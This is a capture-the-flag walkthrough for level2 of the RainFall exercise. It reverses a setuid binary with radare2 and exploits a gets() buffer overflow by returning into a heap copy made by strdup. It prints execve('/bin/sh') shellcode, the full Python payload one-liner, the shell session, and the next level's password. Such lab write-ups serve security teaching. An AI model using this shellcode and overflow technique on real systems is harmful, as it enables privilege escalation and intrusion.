# Level2

As in level1, we can find an executable waiting for an input, print it and quit after press enter
```
level2@RainFall:~$ ls -l
total 8
-rwsr-s---+ 1 level3 users 5403 Mar  6  2016 level2
level2@RainFall:~$ ./level2
bla
bla
level2@RainFall:~$
```
After analyze it with radare2 (please refer to [level1](https://github.com/maxisimo/42-RainFall/blob/main/level1/walkthrough.md) if you want more details on the steps to follow)  
We can see that the `main()` function call a function named `p()`.  
- main() :
```
[0x08048420]> s main
[0x0804853f]> pdda
    ; assembly                           | /* r2dec pseudo code output */
                                         | /* level2 @ 0x804853f */
                                         | #include <stdint.h>
                                         |  
    ; (fcn) main ()                      | int32_t main (void) {
    0x0804853f push ebp                  |
    0x08048540 mov ebp, esp              |
    0x08048542 and esp, 0xfffffff0       |
    0x08048545 call 0x80484d4            |     p ();
    0x0804854a leave                     |
    0x0804854b ret                       |
                                         | }
```
- p() :
```
[0x0804853f]> s sym.p
[0x080484d4]> pdda
    ; assembly                                   | /* r2dec pseudo code output */
                                                 | /* level2 @ 0x80484d4 */
                                                 | #include <stdint.h>
                                                 |  
    ; (fcn) sym.p ()                             | int32_t p (int32_t arg_4h) {
                                                 |     char * src;
                                                 |     int32_t var_ch;
                                                 |     int32_t var_4h;
    0x080484d4 push ebp                          |
    0x080484d5 mov ebp, esp                      |
    0x080484d7 sub esp, 0x68                     |
    0x080484da mov eax, dword [0x8049860]        |     eax = stdout;
    0x080484df mov dword [esp], eax              |
    0x080484e2 call 0x80483b0                    |     fflush (eax);
    0x080484e7 lea eax, [ebp - 0x4c]             |     eax = ebp - 0x4c;
    0x080484ea mov dword [esp], eax              |
    0x080484ed call 0x80483c0                    |     gets (eax);
    0x080484f2 mov eax, dword [ebp + 4]          |     eax = *((ebp + 4));
    0x080484f5 mov dword [ebp - 0xc], eax        |     *((ebp - 0xc)) = eax;
    0x080484f8 mov eax, dword [ebp - 0xc]        |     eax = *((ebp - 0xc));
    0x080484fb and eax, 0xb0000000               |     eax &= 0xb0000000;
    0x08048500 cmp eax, 0xb0000000               |
                                                 |     if (eax == 0xb0000000) {
    0x08048505 jne 0x8048527                     |
    0x08048507 mov eax, 0x8048620                |         eax = "(%p)\n";
    0x0804850c mov edx, dword [ebp - 0xc]        |         edx = *((ebp - 0xc));
    0x0804850f mov dword [esp + 4], edx          |         *((esp + 4)) = edx;
    0x08048513 mov dword [esp], eax              |
    0x08048516 call 0x80483a0                    |         printf (eax);
    0x0804851b mov dword [esp], 1                |
    0x08048522 call 0x80483d0                    |         exit (1);
                                                 |     }
    0x08048527 lea eax, [ebp - 0x4c]             |     eax = ebp - 0x4c;
    0x0804852a mov dword [esp], eax              |
    0x0804852d call 0x80483f0                    |     puts (eax);
    0x08048532 lea eax, [ebp - 0x4c]             |     eax = ebp - 0x4c;
    0x08048535 mov dword [esp], eax              |
    0x08048538 call 0x80483e0                    |     strdup (eax);
    0x0804853d leave                             |     
    0x0804853e ret                               |     return eax;
                                                 | }
[0x080484d4]>
```
Let focus on the `p()` function.  
As in level1, we can see call to `gets()` function with a size of 0x4c (76) wich is vulnerable to buffer overflow attack.
```
    0x080484e7 lea eax, [ebp - 0x4c]             |     eax = ebp - 0x4c;
    0x080484ea mov dword [esp], eax              |
    0x080484ed call 0x80483c0                    |     gets (eax);
```
But to get the real size of the buffer we have to add 4 more bytes to reach the return adress (push ebp) => buffer = 80.  
A check is made to make sure we dont overwrite the return address to an adress on the stack
```
    0x080484fb and eax, 0xb0000000               |     eax &= 0xb0000000;
    0x08048500 cmp eax, 0xb0000000               |     if (eax == 0xb0000000) {
		                    
									more code...

	0x08048522 call 0x80483d0                    |         exit (1);
                                                 |     }
```
Due to this check we couldn't point the return address to the stack. This avoids having a shellcode stored on the stack or in environment variable.  
But if we can't use the stack we can use the heap !  
We see in the program that the buffer is later copied inside a strdup. This function use malloc who store the memory in ... the heap.
```
	0x08048538 call 0x80483e0                    |     strdup (eax);
```
We can see that malloc always return the address `0x804a008` :
```
level2@RainFall:~$ ltrace ./level2
__libc_start_main(0x804853f, 1, 0xbffff7f4, 0x8048550, 0x80485c0 <unfinished ...>
fflush(0xb7fd1a20)								= 0
gets(0xbffff6fc, 0, 0, 0xb7e5ec73, 0x80482b5)	= 0xbffff6fc
puts("")										= 1
strdup("")										= 0x0804a008
+++ exited (status 8) +++
level2@RainFall:~$
```
Now we can try to copy a shellcode in the heap by writing it in the input prompt and then write the allocated address (malloc) on the return address.  
Thanks to internet we'll use some Linux shellcode we found online which will run execve(/bin/sh)  
`\x31\xd2\x31\xc9\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x31\xc0\xb0\x0b\x89\xe3\x83\xe4\xf0\xcd\x80`  
Since our shellcode is 26 bytes long we could pad the back with any byte sequence, until 80 bytes then 4 last bytes for the return adress.  
Our final attack buffer will looks like :  
- shellcode 			: 26 bytes
- pad of arbitrary data : 54 bytes
- return adress			: 4 bytes
```
level2@RainFall:~$ python -c "print '\x31\xd2\x31\xc9\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x31\xc0\xb0\x0b\x89\xe3\x83\xe4\xf0\xcd\x80' + 'a' * 54 + '\x08\xa0\x04\x08'" >/tmp/exploit
level2@RainFall:~$ cat /tmp/exploit - | ./level2
11Qh//shh/bin1��
               ̀aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
whoami
level3
cat /home/user/level3/.pass  
492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
^C
level2@RainFall:~$ su level3
Password:
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level3/level3
level3@RainFall:~$
```
Level2 passed!
